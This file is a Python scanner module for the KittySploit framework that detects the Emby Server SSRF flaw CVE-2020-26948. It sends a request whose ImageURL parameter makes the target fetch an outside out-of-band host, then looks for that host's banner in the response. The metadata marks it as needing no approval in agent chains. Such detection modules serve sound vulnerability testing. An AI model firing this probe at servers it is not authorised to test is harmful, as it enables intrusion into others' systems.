#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Emby Server before 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Emby < 4.5.0 - Server Server-Side Request Forgery Detection',
        'description': 'Emby Server before 4.5.0 allows server-side request forgery (SSRF) via the Items/RemoteSearch/Image ImageURL parameter.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'emby', 'jellyfin', 'ssrf', 'vuln', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/btnz-k/emby_ssrf',
            'https://github.com/btnz-k/emby_ssrf/blob/master/emby_scan.rb',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/Live-Hack-CVE/CVE-2020-26948',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-26948',
        ],
        'cve': 'CVE-2020-26948',
    }

    def run(self):
        path = '/Items/RemoteSearch/Image?ProviderName=TheMovieDB&ImageURL=http://oast.fun'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        body_any = ('<h1> Interactsh Server </h1>',)
        ctype_any = ('text/html', 'application/octet-stream',)
        if (any(m in body for m in body_any)) and (any(m in content_type for m in ctype_any)):
            self.set_info(
                severity='critical',
                reason='Emby < 4.5.0 - Server Server-Side Request Forgery detected',
                path=path,
            )
            return True
        return False

